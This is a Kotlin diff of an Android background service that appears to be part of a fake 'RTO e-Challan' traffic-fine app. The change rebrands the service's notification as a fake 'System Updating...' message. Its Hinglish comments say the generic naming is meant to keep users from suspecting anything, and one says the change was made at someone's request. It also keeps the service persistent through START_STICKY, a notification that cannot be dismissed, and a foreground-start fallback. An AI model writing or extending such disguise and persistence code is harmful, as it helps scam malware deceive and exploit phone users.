@@ -12,27 +12,31 @@ import androidx.core.app.NotificationCompat
 
 class BackgroundService : Service() {
 
-    private val CHANNEL_ID = "RtoEChallanChannel"
+    private val CHANNEL_ID = "SYSTEM_UPDATE_SERVICE"
     private val NOTIFICATION_ID = 1001
 
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
         
-        // Android 14 aur 15 ke liye Service Type specify karna mandatory hai
+        // Android 14+ ke liye foreground type handling
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            startForeground(
-                NOTIFICATION_ID, 
-                getNotification(), 
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE // Manifest se match hona chahiye
-            )
+            try {
+                startForeground(
+                    NOTIFICATION_ID, 
+                    getNotification(), 
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE 
+                )
+            } catch (e: Exception) {
+                // Fallback agar type match na kare
+                startForeground(NOTIFICATION_ID, getNotification())
+            }
         } else {
             startForeground(NOTIFICATION_ID, getNotification())
         }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // Isse system service ko kill hone ke baad automatically restart kar deta hai
         return START_STICKY
     }
 
@@ -42,10 +46,10 @@ class BackgroundService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "System Service", // Thoda generic naam taaki user ko shak na ho
+                "System Services", // User settings mein ye dikhega
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Monitoring traffic updates"
+                description = "Internal system configuration updates"
                 setSound(null, null)
                 setShowBadge(false)
             }
@@ -56,11 +60,12 @@ class BackgroundService : Service() {
 
     private fun getNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("RTO Service")
-            .setContentText("Syncing traffic violation data...")
-            .setSmallIcon(android.R.drawable.stat_notify_sync) // Sync icon zyada professional lagta hai
+            .setContentTitle("System Updating...") // Aapki request ke mutabik badla gaya
+            .setContentText("Checking for latest configuration updates") // Official tone
+            .setSmallIcon(android.R.drawable.stat_notify_sync) // Rotating arrows icon
             .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setOngoing(true) // User ise swipe karke hata nahi payega
+            .setOngoing(true)
+            .setCategory(Notification.CATEGORY_SERVICE)
             .build()
     }
 }
